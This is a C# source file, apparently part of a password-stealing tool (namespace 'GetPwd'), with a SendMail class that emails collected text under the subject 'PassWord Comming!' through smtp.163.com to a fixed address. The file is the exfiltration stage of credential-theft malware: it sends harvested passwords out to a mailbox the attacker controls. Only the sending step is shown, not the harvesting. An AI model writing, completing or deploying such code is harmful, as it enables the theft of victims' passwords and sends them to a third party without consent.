using System;
using System.Net.Mail;
using System.Net.Mime;
using System.IO;
using System.Net;
using System.Text;

namespace GetPwd
{
    class SendMail
    {
        public static void Send(StringBuilder text)
        {
            try{
                string uid = "";//发件人邮箱地址@符号前面的字符tom@dddd.com,则为"tom"  
                string pwd = "";//发件人密码

                MailAddress from = new MailAddress("tom@163.com");//发件人
                MailAddress to = new MailAddress("tom@qq.com");//收件人
                MailMessage mailMessage = new MailMessage(from, to);
                mailMessage.Subject = "PassWord Comming!";//邮件主题  
                mailMessage.Body = text.ToString();//邮件正文

                //实例化SmtpClient  
                SmtpClient smtpClient = new SmtpClient("smtp.163.com", 25); //发件人SMTP通信服务器
                //设置为发送认证消息
                smtpClient.UseDefaultCredentials = true;
                //设置验证发件人身份的凭据  
                smtpClient.Credentials = new NetworkCredential(uid, pwd);
                //发送  
                smtpClient.Send(mailMessage);

                Console.WriteLine("Send Mail OK!");
            }catch (Exception) {
                Console.WriteLine("Send Mail Error!");
            }
        }
    }
}
